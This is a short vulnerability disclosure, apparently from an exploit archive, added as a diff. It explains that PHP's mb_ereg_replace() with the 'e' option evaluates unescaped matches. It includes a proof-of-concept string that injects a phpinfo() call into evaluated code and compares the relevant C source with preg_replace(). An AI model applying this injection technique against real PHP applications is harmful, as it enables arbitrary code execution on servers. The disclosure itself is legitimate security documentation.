@@ -1,0 +1,55 @@
+mb_ereg(i)_replace() evaluate replacement string vulnerability
+ 
+by ryat#www.80vul.com
+
+when option parameter set e, matchs not be escaped.
+
+ex:
+
+<?php
+
+function hi80vul() {}
+
+$str = '\', phpinfo(), \'';
+mb_ereg_replace('^(.*)$', 'hi80vul(\'\1\')', $str, 'e');
+
+?>
+
+phpinfo() will be evaluated.
+
+mb_ereg_replace()
+
+    if ((replace_len - i) >= 2 && fwd == 1 &&
+     p[0] == '\\' && p[1] >= '0' && p[1] <= '9') {
+     n = p[1] - '0';
+    }
+    if (n >= 0 && n < regs->num_regs) {
+     if (regs->beg[n] >= 0 && regs->beg[n] < regs->end[n] && regs->end[n] <= string_len) {
+      smart_str_appendl(pbuf, string + regs->beg[n], regs->end[n] - regs->beg[n]);
+// matchs not be escaped
+     }
+     
+preg_replace()
+
+  if ('\\' == *walk || '$' == *walk) {
+   smart_str_appendl(&code, segment, walk - segment);
+   if (walk_last == '\\') {
+    code.c[code.len-1] = *walk++;
+    segment = walk;
+    walk_last = 0;
+    continue;
+   }
+   segment = walk;
+   if (preg_get_backref(&walk, &backref)) {
+    if (backref < count) {
+     /* Find the corresponding string match and substitute it
+        in instead of the backref */
+     match = subject + offsets[backref<<1];
+     match_len = offsets[(backref<<1)+1] - offsets[backref<<1];
+     if (match_len) {
+      esc_match = php_addslashes_ex(match, match_len, &esc_match_len, 0, 1 TSRMLS_CC);
+// matchs escaped by addslashes()
+...
+    smart_str_appendl(&code, esc_match, esc_match_len);
+
+# milw0rm.com [2009-05-07]
